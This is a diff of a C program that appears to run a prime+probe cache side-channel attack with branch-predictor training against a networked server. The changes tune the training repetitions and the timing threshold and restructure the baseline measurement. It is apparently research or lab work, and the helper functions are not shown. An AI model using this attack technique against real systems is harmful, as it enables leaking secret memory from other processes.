@@ -21,7 +21,7 @@
 
 
 // prime+probe
-#define TRAINING_REPS 50
+#define TRAINING_REPS 100
 #define ATTACK_RUNS 10000
 #define BASELINE_RUNS 10000
 #define EVICTION_THRESHOLD 0
@@ -58,7 +58,7 @@ int main(int argc, char* argv[]) {
 
 
     // find threshold
-    c_threshold = 100;//cache_threshold(); // or set ~100
+    c_threshold = 140;//cache_threshold(); // or set ~100
 
     // prep attack and training data for request
     char *valid_data = 
@@ -72,26 +72,33 @@ int main(int argc, char* argv[]) {
     char attack_data[256];
     get_inputs(attack_data, argc, argv);
     
-
-
-    // generates baseline set
-    int baseline[SETS] = {0};    
+    // warm cache?
+  /*   int trash[SETS] = {0};    
+    for(int i = 0; i < BASELINE_RUNS; i++){
+        for(int i = 0; i < TRAINING_REPS; i++){
+            make_request(valid_data, &clientfd);
+        }
+        primeprobe(valid_data, &clientfd, trash);
+    }
+ */
+    int baseline[SETS] = {0}; 
+  /*   // generates baseline set
+       
     for(int i = 0; i < BASELINE_RUNS; i++){
         for(int i = 0; i < TRAINING_REPS; i++){
             make_request(valid_data, &clientfd);
         }
         primeprobe(valid_data, &clientfd, baseline);
     }
-
+ */
     int count[SETS] = {0}; // records sets that have been touched
     for (int j = 0; j < ATTACK_RUNS; j++) {
 
-        
+        primeprobe(valid_data, &clientfd, baseline);    
         // Train BP
         for(int i = 0; i < TRAINING_REPS; i++){
             make_request(valid_data, &clientfd);
         }
-            
     
         primeprobe(attack_data, &clientfd, count);
     } 
@@ -101,7 +108,7 @@ int main(int argc, char* argv[]) {
     printf("\n===== Eviction Difs =====\n");
     for (int i = 0; i < SETS; i++) { 
         int diff = count[i] - baseline[i];
-        printf("Set %d: +%d -> (attack: %d, baseline: %d)\n", i, diff, count[i], baseline[i]); // print diff
+        printf("Set %d: %d -> (attack: %d, baseline: %d)\n", i, diff, count[i], baseline[i]); // print diff
     }
     //curl_easy_cleanup(curl_handle);
     close(clientfd);
